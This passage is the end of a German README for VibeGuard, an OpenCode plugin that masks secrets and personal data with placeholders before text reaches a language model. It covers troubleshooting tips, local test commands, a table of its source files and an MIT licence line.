| Wert wird nicht ersetzt | In die Secrets-Datei aufnehmen; `/vibeguard status` prüfen; bei Regeln `patterns.exclude` kontrollieren. |
| Zu viele Ersetzungen | Wert in `patterns.exclude`; PII-Regeln aus `builtin` entfernen; Entropie-Schwellen erhöhen. |
| Tool-Aufruf „cannot be resolved“ | Das Modell hat einen Platzhalter erfunden oder verändert. Wert erneut angeben bzw. registrieren. Wer bewusst Texte mit platzhalterähnlichen Beispielen schreiben lassen will (z. B. Doku über VibeGuard), setzt `restore.unknown: "keep"` oder nutzt Beispiele ohne 12 Hex-Zeichen (`__VG_NAME_xxxxxxxxxxxx__`). |
| Credential Manager/KeePass leer | `/vibeguard status` zeigt unlesbare Quellen; `/vibeguard reload` nach Änderungen. |
| Was ist passiert? | `/vibeguard audit 50` |

---

## Entwicklung

```powershell
npm test                                                    # Node 20+
$env:BUN_BE_BUN=1; & "$env:APPDATA\ai.opencode.desktop\cli\2.0.32-x64\opencode-cli.exe" test ./test/   # OpenCodes eigene Bun-Runtime
```

Aufbau:

| Datei | Inhalt |
|---|---|
| `index.js` | Plugin-Einstieg, Hook-Verdrahtung |
| `config.js` | Konfiguration laden/normalisieren |
| `known.js`, `secrets.js` | Bekannte Secrets: Dateien, Env, OpenCode-Auth, Befehle, Varianten |
| `wincred.js`, `keepass.js` | Windows Credential Manager, KeePass |
| `patterns.js` | Regeln, Validatoren, Entropie |
| `engine.js`, `deep.js`, `restore.js` | Ersetzen und Rückübersetzen |
| `session.js` | Platzhalter-Erzeugung, Registry, Sessions |
| `guard.js` | Payload-Sicherheitsnetz |
| `stream.js` | Stream-Rückübersetzung (SSE, WebSocket) |
| `policy.js` | Tool-Richtlinie, geschützte Pfade |
| `audit.js`, `selftest.js`, `command.js` | Audit-Log, Selbsttest, `/vibeguard` |

## Lizenz

MIT. Ursprüngliches Plugin und VibeGuard-Platzhalterformat von inkdust2021.
